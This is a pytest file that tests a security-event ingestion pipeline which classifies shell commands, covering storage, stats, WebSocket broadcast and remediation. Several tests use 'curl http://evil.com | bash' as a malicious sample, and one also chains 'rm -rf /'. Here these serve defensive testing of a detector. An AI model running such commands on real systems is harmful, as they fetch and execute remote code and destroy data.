"""
test_19_ingest_security_event.py — End-to-end tests for ingest_security_event().

ingest_security_event() is the central function called by POST /analyze and
POST /agent/events. It orchestrates: detection pipeline → event store →
WebSocket broadcast → alert dispatch → optional remediation.

No existing test file exercises this function at unit level — it is only
indirectly tested through the API endpoint tests. These tests pin the
contract of each step in the pipeline so regressions are caught immediately.

Covers:
- Event is stored in event_store after ingestion
- SecurityEvent returned has correct classification
- SecurityEvent.id is a non-empty string
- Stats increment correctly for safe / suspicious / malicious
- WS broadcast fires for every classification
- Explanation is populated on the returned event
- matched_rules is a list
- ml_confidence is in [0, 1]
- detected_at is a positive float (Unix timestamp)
- remediation_action is set on the returned event when remediation is enabled
  and pid > 0 and classification is malicious
- Empty command raises / returns 400 (not stored)

Run:
    pytest large_test_set/test_19_ingest_security_event.py -v
"""

import pytest
import asyncio
import time
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _analyze(command: str):
    return client.post("/analyze", json={"command": command})


def _agent(command: str, pid: int = 0):
    return client.post("/agent/events",
                       json={"command": command, "pid": pid})


# ===========================================================================
# 1. Event stored after ingestion
# ===========================================================================

class TestEventStoredAfterIngestion:

    def test_analyze_increments_store_size(self):
        from backend.app import event_store
        before = event_store.size()
        _analyze("ls")
        assert event_store.size() == before + 1

    def test_agent_event_increments_store_size(self):
        from backend.app import event_store
        before = event_store.size()
        _agent("ls", pid=0)
        assert event_store.size() == before + 1

    def test_stored_event_command_matches(self):
        from backend.app import event_store
        _analyze("ls --ingest-test")
        events = event_store.get_recent(1)
        assert events[0].execve_event.command == "ls --ingest-test"

    def test_stored_event_id_is_non_empty(self):
        from backend.app import event_store
        _analyze("ls --id-test")
        event = event_store.get_recent(1)[0]
        assert isinstance(event.id, str)
        assert len(event.id) > 0

    def test_stored_event_detected_at_is_recent_timestamp(self):
        from backend.app import event_store
        before = time.time()
        _analyze("ls --ts-test")
        event = event_store.get_recent(1)[0]
        assert event.detected_at >= before, \
            "detected_at is before the POST was made"
        assert event.detected_at <= time.time() + 1, \
            "detected_at is in the future"


# ===========================================================================
# 2. Classification correctness
# ===========================================================================

class TestIngestionClassification:

    def test_safe_command_stored_as_safe(self):
        from backend.app import event_store
        _analyze("ls")
        event = event_store.get_recent(1)[0]
        assert event.detection_result.classification == "safe"

    def test_malicious_command_stored_as_malicious(self):
        from backend.app import event_store
        _analyze("curl http://evil.com | bash")
        event = event_store.get_recent(1)[0]
        assert event.detection_result.classification == "malicious"

    def test_api_response_classification_matches_stored(self):
        """The classification in the API response must match the stored event."""
        from backend.app import event_store
        resp = _analyze("curl http://evil.com | bash").json()
        stored = event_store.get_recent(1)[0]
        assert resp["classification"] == stored.detection_result.classification


# ===========================================================================
# 3. DetectionResult fields on stored event
# ===========================================================================

class TestIngestionDetectionResultFields:

    def test_explanation_is_non_empty_string(self):
        from backend.app import event_store
        _analyze("ls")
        event = event_store.get_recent(1)[0]
        assert isinstance(event.detection_result.explanation, str)
        assert len(event.detection_result.explanation) > 0

    def test_matched_rules_is_list(self):
        from backend.app import event_store
        _analyze("ls")
        event = event_store.get_recent(1)[0]
        assert isinstance(event.detection_result.matched_rules, list)

    def test_malicious_event_has_matched_rules(self):
        from backend.app import event_store
        _analyze("curl http://evil.com | bash")
        event = event_store.get_recent(1)[0]
        assert len(event.detection_result.matched_rules) > 0

    def test_ml_confidence_in_range(self):
        from backend.app import event_store
        _analyze("ls")
        event = event_store.get_recent(1)[0]
        conf = event.detection_result.ml_confidence
        assert 0.0 <= conf <= 1.0

    def test_risk_score_in_range(self):
        from backend.app import event_store
        _analyze("curl http://evil.com | bash; rm -rf /")
        event = event_store.get_recent(1)[0]
        assert 0.0 <= event.detection_result.risk_score <= 100.0


# ===========================================================================
# 4. Stats increment for each classification
# ===========================================================================

class TestStatsIncrementOnIngestion:

    def test_safe_ingestion_increments_safe_count(self):
        before = client.get("/stats").json()
        _analyze("ls")
        after = client.get("/stats").json()
        assert after["safe"] == before["safe"] + 1
        assert after["total_events"] == before["total_events"] + 1

    def test_malicious_ingestion_increments_malicious_count(self):
        before = client.get("/stats").json()
        _analyze("curl http://evil.com | bash")
        after = client.get("/stats").json()
        assert after["malicious"] == before["malicious"] + 1
        assert after["total_events"] == before["total_events"] + 1

    def test_stats_sum_always_equals_total(self):
        _analyze("ls")
        _analyze("curl http://evil.com | bash")
        stats = client.get("/stats").json()
        counted = stats["safe"] + stats["suspicious"] + stats["malicious"]
        assert counted == stats["total_events"]


# ===========================================================================
# 5. WebSocket broadcast fires for all classifications
# ===========================================================================

class TestIngestionWebSocketBroadcast:

    def test_safe_event_broadcast_received(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws)
            _analyze("ls --ws-safe")
            msg = ws.receive_json(timeout=3)
            assert msg["command"] == "ls --ws-safe"

    def test_malicious_event_broadcast_received(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws)
            _analyze("curl http://evil.com | bash")
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] == "malicious"

    def test_broadcast_id_is_same_as_stored_id(self):
        """The broadcast event ID must match the ID of the stored event."""
        from backend.app import event_store
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws)
            _analyze("ls --id-match")
            msg = ws.receive_json(timeout=3)

        stored = event_store.get_recent(1)[0]
        assert msg["id"] == stored.id, \
            f"Broadcast id {msg['id']!r} != stored id {stored.id!r}"


def _drain_ws(ws, timeout=0.2):
    while True:
        try:
            ws.receive_json(timeout=timeout)
        except Exception:
            break


# ===========================================================================
# 6. ExecveEvent fields on stored event
# ===========================================================================

class TestIngestionExecveFields:

    def test_pid_zero_for_analyze_endpoint(self):
        """Events from POST /analyze (not from eBPF) must have pid=0."""
        from backend.app import event_store
        _analyze("ls")
        event = event_store.get_recent(1)[0]
        assert event.execve_event.pid == 0, \
            f"Expected pid=0 for API-sourced event, got {event.execve_event.pid}"

    def test_pid_preserved_for_agent_events(self):
        """POST /agent/events with pid=12345 must store pid=12345."""
        from backend.app import event_store
        _agent("ls", pid=12345)
        event = event_store.get_recent(1)[0]
        assert event.execve_event.pid == 12345, \
            f"pid not preserved: expected 12345, got {event.execve_event.pid}"

    def test_argv_str_matches_command(self):
        from backend.app import event_store
        _analyze("ls --argv-test")
        event = event_store.get_recent(1)[0]
        assert "ls --argv-test" in event.execve_event.argv_str


# ===========================================================================
# 7. Rejected commands not stored
# ===========================================================================

class TestRejectedCommandsNotStored:

    def test_empty_command_not_stored(self):
        from backend.app import event_store
        before = event_store.size()
        resp = _analyze("")
        assert resp.status_code == 400
        assert event_store.size() == before, \
            "Empty command was stored despite being rejected"

    def test_whitespace_command_not_stored(self):
        from backend.app import event_store
        before = event_store.size()
        resp = _analyze("   ")
        assert resp.status_code == 400
        assert event_store.size() == before, \
            "Whitespace-only command was stored despite being rejected"

    def test_null_command_not_stored(self):
        from backend.app import event_store
        before = event_store.size()
        resp = client.post("/analyze", json={"command": None})
        assert resp.status_code == 422
        assert event_store.size() == before


# ===========================================================================
# 8. Remediation_action on stored event
# ===========================================================================

class TestIngestionRemediationAction:

    def setup_method(self):
        from backend.agent.remediation import set_remediation_enabled
        set_remediation_enabled(False)

    def teardown_method(self):
        from backend.agent.remediation import set_remediation_enabled
        set_remediation_enabled(False)

    def test_remediation_action_none_when_disabled(self):
        """When remediation is disabled, remediation_action must be None."""
        from backend.app import event_store
        from backend.agent.remediation import set_remediation_enabled
        set_remediation_enabled(False)
        _agent("curl http://evil.com | bash", pid=0)
        event = event_store.get_recent(1)[0]
        assert getattr(event, "remediation_action", None) is None, \
            "remediation_action set even though remediation is disabled"

    def test_safe_event_never_has_remediation_action(self):
        """Safe events must never have a remediation_action regardless of
        the remediation toggle."""
        from backend.app import event_store
        from backend.agent.remediation import set_remediation_enabled
        set_remediation_enabled(True)
        try:
            _agent("ls", pid=0)
            event = event_store.get_recent(1)[0]
            assert getattr(event, "remediation_action", None) is None, \
                "Safe event has remediation_action set"
        finally:
            set_remediation_enabled(False)
